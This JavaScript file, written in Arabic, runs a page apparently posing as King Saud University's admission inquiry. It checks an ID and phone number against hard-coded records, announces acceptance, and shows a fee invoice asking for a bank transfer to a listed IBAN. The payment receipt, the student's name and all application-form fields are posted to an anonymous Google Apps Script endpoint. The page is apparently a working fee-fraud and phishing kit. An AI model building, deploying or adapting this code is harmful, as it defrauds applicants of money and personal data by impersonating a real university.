// =================== بيانات الطلاب (محاكاة) ===================
const studentData = {
    "1145181531": {
        name: "أحمد منير توفيق الأيوبي",
        degree: "بكالوريوس",
        major: "فيزياء",
        status: "مقبول",
        admissionDate: "2025/07/04",
        phone: "0566962545",
        fees: {
            tuition: 1500,
            registration: 0,
            books: 0,
            total: 1500
        }
    },
    "1234567890": {
        name: "سارة محمد الحربي",
        degree: "ماجستير",
        major: "رياضيات",
        status: "مقبول",
        admissionDate: "2025/08/10",
        phone: "0501234567",
        fees: {
            tuition: 2000,
            registration: 100,
            books: 200,
            total: 2300
        }
    }
};

let currentStudent = null;

// =================== دوال مساعدة ===================
function hideAllForms() {
    document.getElementById("forms-section").classList.add("hidden");
    document.getElementById("results-section").classList.add("hidden");
    document.getElementById("inquiry-form").classList.add("hidden");
    document.getElementById("application-form-container")?.classList.add("hidden");
}

function scrollToElement(id) {
    document.getElementById(id).scrollIntoView({ behavior: "smooth", block: "start" });
}

// =================== الاستعلام عن القبول ===================
function showInquiryForm() {
    hideAllForms();
    document.getElementById("forms-section").classList.remove("hidden");
    document.getElementById("inquiry-form").classList.remove("hidden");
    document.getElementById("inquiry-id").value = "";
    document.getElementById("inquiry-phone").value = "";
    scrollToElement("forms-section");
}

function checkAdmission() {
    const id = document.getElementById("inquiry-id").value;
    const phone = document.getElementById("inquiry-phone").value;

    if (!id || !phone) {
        alert("الرجاء إدخال رقم الهوية ورقم الجوال.");
        return;
    }

    if (studentData[id] && studentData[id].phone === phone) {
        currentStudent = studentData[id];
        showAdmissionResult();
    } else {
        alert("عذراً، لا توجد بيانات قبول مطابقة.");
    }
}

function showAdmissionResult() {
    hideAllForms();
    const resultsSection = document.getElementById("results-section");
    resultsSection.innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>تم قبولك بنجاح!</h3>
                <p class="status-accepted">مبروك! تم قبولك في جامعة الملك سعود</p>
            </div>
            <div class="student-info">
                <div class="info-item"><label>الاسم:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>الدرجة العلمية:</label><span>${currentStudent.degree}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
                <div class="info-item"><label>حالة القبول:</label><span>${currentStudent.status}</span></div>
                <div class="info-item"><label>تاريخ القبول:</label><span>${currentStudent.admissionDate}</span></div>
            </div>
            <button class="submit-btn" onclick="showConfirmationSuccess()">تأكيد القبول</button>
        </div>
    `;
    resultsSection.classList.remove("hidden");
    scrollToElement("results-section");
}

// =================== تأكيد القبول ===================
function showConfirmationSuccess() {
    hideAllForms();
    const resultsSection = document.getElementById("results-section");
    resultsSection.innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>تم تأكيد قبولك بنجاح!</h3>
                <p class="status-accepted">مبروك! تم تأكيد قبولك في جامعة الملك سعود</p>
            </div>
            <div class="student-info">
                <div class="info-item"><label>الاسم:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>الدرجة العلمية:</label><span>${currentStudent.degree}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
            </div>
            <button class="submit-btn" onclick="showPaymentInvoice()">السداد</button>
        </div>
    `;
    resultsSection.classList.remove("hidden");
    scrollToElement("results-section");
}

// =================== فاتورة السداد ===================
function showPaymentInvoice() {
    hideAllForms();
    const resultsSection = document.getElementById("results-section");
    resultsSection.innerHTML = `
        <div class="result-card">
            <div class="result-header">
                <h3>فاتورة السداد</h3>
                <p>الرجاء سداد الرسوم المستحقة لإتمام التسجيل</p>
            </div>
            <div class="student-info">
                <div class="info-item"><label>الطالب:</label><span>${currentStudent.name}</span></div>
                <div class="info-item"><label>التخصص:</label><span>${currentStudent.major}</span></div>
            </div>
            <div class="payment-invoice">
                <div class="invoice-header"><h4>تفاصيل الرسوم</h4></div>
                <div class="invoice-details">
                    <div class="invoice-item"><span>الرسوم الدراسية:</span><span>${currentStudent.fees.tuition} ريال</span></div>
                    <div class="invoice-item"><span>رسوم التسجيل:</span><span>${currentStudent.fees.registration} ريال</span></div>
                    <div class="invoice-item"><span>رسوم الكتب:</span><span>${currentStudent.fees.books} ريال</span></div>
                </div>
                <div class="invoice-total"><p>المجموع الكلي</p><p class="total-amount">${currentStudent.fees.total} ريال سعودي</p></div>
            </div>
            <div class="bank-info">
                <h5>معلومات التحويل البنكي</h5>
                <div class="bank-details">
                    <div class="bank-item"><span>اسم البنك:</span><span>راجحي</span></div>
                    <div class="bank-item"><span>رقم الحساب:</span><span>SA3380000984608016472540</span></div>
                </div>
                <div class="upload-section">
                    <h5>رفع إيصال السداد</h5>
                    <div class="upload-area" onclick="document.getElementById('receipt-upload').click()">
                        <input type="file" id="receipt-upload" accept=".pdf,.jpg,.png" onchange="displayFileName()">
                        <div class="upload-icon">📄</div>
                        <p>اضغط هنا لرفع إيصال السداد</p>
                        <p id="file-name" style="font-size: 14px; color: #555;"></p>
                    </div>
                    <button class="submit-btn mt-20" onclick="submitPayment()">إرسال إيصال السداد</button>
                </div>
            </div>
        </div>
    `;
    resultsSection.classList.remove("hidden");
    scrollToElement("results-section");
}

function displayFileName() {
    const fileInput = document.getElementById("receipt-upload");
    const fileNameDisplay = document.getElementById("file-name");
    fileNameDisplay.textContent = fileInput.files.length > 0 ? `الملف المحدد: ${fileInput.files[0].name}` : "";
}

function submitPayment() {
    const fileInput = document.getElementById("receipt-upload");
    if (!fileInput.files[0]) {
        alert("يرجى رفع إيصال السداد أولاً");
        return;
    }

    const url = "https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec";
    const formData = new FormData();
    formData.append("receipt", fileInput.files[0]);
    formData.append("studentName", currentStudent.name);

    fetch(url, { method: 'POST', body: formData })
        .then(response => response.text())
        .then(data => alert("تم إرسال إيصال السداد بنجاح!"))
        .catch(error => console.error("خطأ في الإرسال:", error));
}

// =================== عرض نموذج التقديم ===================
function showApplicationForm() {
    hideAllForms();
    document.getElementById("forms-section").classList.remove("hidden");

    let formContainer = document.getElementById("application-form-container");
    if (!formContainer) {
        formContainer = document.createElement("div");
        formContainer.id = "application-form-container";
        formContainer.classList.add("form-container");
        document.getElementById("forms-section").appendChild(formContainer);
    }

    formContainer.innerHTML = document.getElementById("application-form-template").innerHTML;
    formContainer.classList.remove("hidden");
    scrollToElement("forms-section");

    const applicationForm = document.getElementById("applicationForm");
    const successMessage = document.getElementById("successMessage");

    applicationForm.addEventListener("submit", function(e) {
        e.preventDefault();
        const formData = new FormData(applicationForm);

        fetch("https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec", {
            method: "POST",
            body: formData
        })
        .then(response => response.text())
        .then(data => {
            successMessage.classList.remove("hidden");
            applicationForm.reset();
        })
        .catch(error => alert("حدث خطأ أثناء إرسال البيانات: " + error));
    });
}

// =================== تهيئة الصفحة ===================
document.addEventListener("DOMContentLoaded", () => {
    hideAllForms();
});
